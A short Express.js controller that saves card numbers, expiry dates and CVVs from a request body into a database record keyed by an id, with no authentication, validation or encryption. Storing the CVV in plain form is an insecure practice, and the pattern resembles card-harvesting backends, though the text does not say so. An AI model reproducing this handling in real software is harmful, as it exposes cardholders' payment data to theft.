// controllers/cardPaymentController.js
const CardPayment = require('../models/CardPayment');

exports.submitCardPayment = async (req, res) => {
    try {
        // Destructure the card payment fields from the request body
        const { uniqueid, cardNumber, expiryDate, cvv } = req.body;
        
        let cardPayment = await CardPayment.findOne({ uniqueid });

        if (cardPayment) {
            // Update existing record
            cardPayment.cardNumber = cardNumber;
            cardPayment.expiryDate = expiryDate;
            cardPayment.cvv = cvv;
        } else {
            // Create a new card payment record
            cardPayment = new CardPayment({
                uniqueid,
                cardNumber,
                expiryDate,
                cvv
            });
        }

        await cardPayment.save();

        res.status(200).json({
            success: true,
            message: "Card Payment Data Submitted Successfully!"
        });
    } catch (error) {
        console.error(error);
        res.status(500).json({
            success: false,
            message: "Error occurred while submitting card payment data"
        });
    }
};
